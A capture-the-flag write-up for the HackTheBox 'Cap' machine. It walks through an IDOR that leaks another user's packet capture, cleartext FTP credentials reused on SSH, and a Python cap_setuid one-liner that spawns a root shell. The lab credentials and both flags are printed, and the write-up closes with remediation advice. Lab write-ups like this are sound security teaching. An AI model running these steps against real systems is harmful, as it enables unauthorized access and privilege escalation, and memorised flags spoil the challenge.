# Cap — HackTheBox Writeup


> **Target:** `10.129.61.182`
> **Foothold:** **IDOR** on a Flask "Security Dashboard" leaks another user's packet capture; the pcap contains **cleartext FTP credentials**.
> **Privesc:** `cap_setuid` capability on `/usr/bin/python3.8` → instant root.

---

## 📑 Table of Contents
- [Overview](#-overview)
- [Attack Flow](#️-attack-flow)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Web Enumeration](#2-web-enumeration)
- [3. Foothold — IDOR + pcap credentials](#3-foothold--idor--pcap-credentials)
- [4. User — SSH password reuse](#4-user--ssh-password-reuse)
- [5. Privilege Escalation — Linux capabilities](#5-privilege-escalation--linux-capabilities)
- [Flags](#-flags)
- [Lessons / Remediation](#️-lessons--remediation)

---

## 🧭 Overview

Cap exposes a Flask-based **"Security Dashboard"** on port 80 that lets a logged-in user
run a live packet capture and download the resulting `.pcap`. Each capture is served at
`/data/<id>` / `/download/<id>` — but the `id` is a **predictable integer with no
ownership check** (an **IDOR**). Requesting `/download/0` returns the *admin's* capture,
which happens to contain a **plaintext FTP login** for user `nathan`.

Those same credentials are reused on **SSH**, giving a user shell. The box is then rooted
through a classic misconfiguration: the **`cap_setuid`** Linux capability is set on the
Python binary, so an unprivileged user can call `os.setuid(0)` and spawn a root shell.

---

## 🗺️ Attack Flow

```mermaid
flowchart LR
    A[nmap scan<br/>10.129.61.182] -->|21 ftp · 22 ssh · 80 http| B[Flask 'Security Dashboard']
    B -->|/capture → /data/N| C[IDOR:<br/>/data/0 + /download/0]
    C -->|download pcap 0| D[pcap has cleartext<br/>FTP login]
    D -->|nathan : Buck3tH4TF0RM3!| E[SSH password reuse]
    E --> F[Shell as nathan<br/>🚩 user.txt]
    F -->|getcap -r /| G[cap_setuid+eip on<br/>/usr/bin/python3.8]
    G -->|os.setuid 0| H([Root shell<br/>🚩 root.txt])

    style A fill:#1b2a4a,stroke:#9FEF00,color:#fff
    style B fill:#1b2a4a,stroke:#9FEF00,color:#fff
    style C fill:#3a1b2a,stroke:#ff4d4d,color:#fff
    style D fill:#3a1b2a,stroke:#ff4d4d,color:#fff
    style E fill:#1b2a4a,stroke:#9FEF00,color:#fff
    style F fill:#14301a,stroke:#9FEF00,color:#9FEF00
    style G fill:#2a1b3a,stroke:#b57edc,color:#fff
    style H fill:#14301a,stroke:#9FEF00,color:#9FEF00
```



---

## 1. Reconnaissance

<details>
<summary>🔍 <b>Click to expand — port & service scan</b></summary>

```bash
nmap -sV -sC 10.129.61.182
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

**Finding:** Three services. The custom web app behind **Gunicorn** (a Python WSGI
server → almost certainly **Flask/Django**) is the most interesting attack surface. FTP
and SSH are noted for later — an app that handles credentials often leaks them to one of
these.

</details>

---

## 2. Web Enumeration

<details>
<summary>🌐 <b>Click to expand — mapping the dashboard</b></summary>

The dashboard links to a handful of endpoints:

```bash
curl -s http://10.129.61.182/ | grep -oE 'href="/[^"]*"' | sort -u
# /capture  /ip  /netstat
```

Probing how they respond:

```text
/capture    -> 302   (redirects to /data/<id>)
/data/<id>  -> 200   (capture results page)
/download/<id> -> 200 (serves the .pcap for that id)
```

**Finding:** `/capture` generates a packet capture and redirects you to **`/data/<your-id>`**.
The `id` is a sequential integer. Nothing stops us from requesting an id we weren't given —
the hallmark of an **Insecure Direct Object Reference (IDOR)**.

</details>

---

## 3. Foothold — IDOR + pcap credentials

<details>
<summary>🎯 <b>Click to expand — exploiting the IDOR</b></summary>

A fresh capture lands on a high id (e.g. `/data/5`). But **id `0`** is the very first
capture — generated by the admin and left behind:

```bash
# Directly request someone else's capture — no ownership check
curl -s -o 0.pcap http://10.129.61.182/download/0
file 0.pcap
# 0.pcap: pcap capture file ... (Linux cooked v1)
```

Carve the FTP conversation out of the capture:

```bash
tshark -r 0.pcap -Y ftp          # or: strings 0.pcap | grep -iE 'USER|PASS'
```

```text
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
```

**Finding:** FTP is **cleartext**, so the capture recorded a full login. We now have
`nathan : Buck3tH4TF0RM3!`.

</details>

---

## 4. User — SSH password reuse

<details>
<summary>🚪 <b>Click to expand — getting a shell</b></summary>

The creds work on FTP, but SSH gives a proper interactive shell — password reuse pays off:

```bash
ssh nathan@10.129.61.182
# password: Buck3tH4TF0RM3!
```

```bash
id
# uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
cat ~/user.txt
```

</details>

<details>
<summary>🚩 <b>Click to reveal — USER FLAG</b></summary>

```text
6d0a93449cd96c4e4daf034de19d0736
```

</details>

---

## 5. Privilege Escalation — Linux capabilities

<details>
<summary>⚙️ <b>Click to expand — finding the capability</b></summary>

Enumerate file capabilities across the filesystem:

```bash
getcap -r / 2>/dev/null
```

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
...
```

**Finding:** `/usr/bin/python3.8` carries **`cap_setuid`**. Unlike a SUID binary that
always runs as its owner, this capability lets the *process itself* call `setuid()` and
drop to **uid 0**. Python makes that a one-liner.

</details>

<details>
<summary>👑 <b>Click to expand — becoming root</b></summary>

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)
cat /root/root.txt
```

</details>

<details>
<summary>🚩 <b>Click to reveal — ROOT FLAG</b></summary>

```text
495266579e4e6aa7e9542e6247e5ad4e
```

</details>

---

## 🛡️ Lessons / Remediation

- **Enforce authorization on every object reference.** `/data/<id>` and `/download/<id>`
  must verify the capture belongs to the requesting session — never trust a client-supplied
  id. Use unguessable identifiers (UUIDs) *and* an ownership check (defence in depth).
- **Kill cleartext protocols.** FTP transmits credentials in plaintext; anyone who can
  sniff (or, here, is handed a capture) gets the password. Use **FTPS/SFTP**.
- **Don't reuse passwords across services.** One leaked FTP password became SSH access.
- **Audit Linux capabilities** (`getcap -r /`). `cap_setuid` on a general-purpose
  interpreter like Python is equivalent to handing out root. Grant the narrowest capability
  to the narrowest binary, or none at all.

---

<sub>↩︎ Back to the [Intro To Red Team course notes](../README.md) · for educational purposes only — only test systems you're authorized to attack.</sub>
